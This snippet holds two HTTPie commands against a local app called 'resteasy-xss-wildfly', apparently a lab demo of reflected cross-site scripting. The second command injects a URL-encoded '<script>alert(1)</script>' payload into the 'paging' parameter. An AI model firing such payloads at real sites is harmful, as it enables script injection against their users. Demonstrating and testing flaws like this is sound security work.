```bash
$ http "localhost:8080/resteasy-xss-wildfly/rest/users?paging=1"
```

```bash
$ http "http://localhost:8080/resteasy-xss-wildfly/rest/users?paging=0%2c-1sp137%3Cscript%3Ealert(1)%3C%2fscript%3Emzx4u"
```